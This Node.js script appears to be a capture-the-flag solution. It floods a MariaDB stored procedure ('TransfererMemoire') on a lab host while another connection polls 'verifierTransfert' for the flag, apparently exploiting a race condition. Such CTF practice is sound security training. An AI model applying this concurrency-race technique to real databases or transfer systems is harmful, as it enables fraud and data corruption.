const mariadb = require('mariadb');

async function executeLoop() {
    const conn = await mariadb.createConnection({
        host: 'auditorium.ctf',
        user: 'user',
        password: 'password',
        database: 'CoDi',
    });

    for (let i = 0; i < 100; i++) {
        try {
            await conn.query('CALL TransfererMemoire()');
        } catch (err) {
            console.log(err);
        }
    }
    conn.end();
}

async function getFlag() {
    const conn = await mariadb.createConnection({
        host: 'auditorium.ctf',
        user: 'user',
        password: 'password',
        database: 'CoDi',
    });

    for (let i = 0; i < 100; i++) {
        try {
            const res = await conn.query('CALL verifierTransfert()');
            if(res[0][0]){
                console.log('FLAG FOUND', res[0][0]);
                break;
            }
        } catch (err) {
            console.log(err);
        }
    }
    conn.end();
}

executeLoop();
getFlag();